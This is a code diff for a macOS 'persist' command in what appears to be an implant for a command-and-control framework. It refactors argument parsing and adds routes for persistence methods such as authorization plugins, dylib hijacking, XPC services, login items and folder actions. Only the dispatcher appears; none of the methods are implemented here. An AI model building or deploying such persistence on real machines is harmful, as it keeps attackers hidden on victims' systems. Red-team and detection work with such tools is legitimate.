@@ -4,7 +4,6 @@
 package commands
 
 import (
-	"encoding/json"
 	"fmt"
 	"os"
 	"os/exec"
@@ -37,14 +36,9 @@ type persistArgs struct {
 }
 
 func (c *PersistCommand) Execute(task structs.Task) structs.CommandResult {
-	var args persistArgs
-
-	if task.Params == "" {
-		return errorResult("Error: parameters required (method, action, name, path)")
-	}
-
-	if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
-		return errorf("Error parsing parameters: %v", err)
+	args, parseErr := unmarshalParams[persistArgs](task)
+	if parseErr != nil {
+		return *parseErr
 	}
 
 	if args.Action == "" {
@@ -60,10 +54,22 @@ func (c *PersistCommand) Execute(task structs.Task) structs.CommandResult {
 		return persistSSHKey(args)
 	case "crontab", "cron":
 		return persistCrontab(args)
+	case "periodic", "periodic-script":
+		return persistPeriodic(args)
+	case "folder-action", "folder-actions":
+		return persistFolderAction(args)
+	case "login-item", "login-items", "loginitem":
+		return persistLoginItem(args)
+	case "auth-plugin", "authorization-plugin", "authplugin":
+		return persistAuthPlugin(args)
+	case "dylib-hijack", "dylib", "dylibhijack":
+		return persistDylibHijack(args)
+	case "xpc-service", "xpc", "xpcservice":
+		return persistXPCService(args)
 	case "list":
 		return persistDarwinList()
 	default:
-		return errorf("Unknown method: %s. Use: launchagent, shell-profile, ssh-key, crontab, or list", args.Method)
+		return errorf("Unknown method: %s. Use: launchagent, shell-profile, ssh-key, crontab, periodic, folder-action, login-item, auth-plugin, dylib-hijack, xpc-service, or list", args.Method)
 	}
 }
 
